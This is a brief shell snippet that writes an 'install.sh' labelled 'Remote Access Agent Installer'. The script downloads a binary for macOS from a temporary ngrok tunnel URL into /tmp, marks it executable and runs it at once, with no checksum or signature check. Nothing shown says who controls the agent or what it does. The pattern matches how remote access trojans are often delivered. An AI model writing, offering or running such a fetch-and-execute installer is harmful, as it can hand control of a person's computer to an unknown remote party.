cat > install.sh << 'EOF'
#!/bin/bash

echo "=================================="
echo "Remote Access Agent Installer"
echo "=================================="
echo ""

echo "📥 Downloading agent..."
curl -L -o /tmp/agent-mac https://5096305f01d5.ngrok-free.app/download/agent-mac

echo "✅ Making executable..."
chmod +x /tmp/agent-mac

echo "🚀 Starting agent..."
/tmp/agent-mac
EOF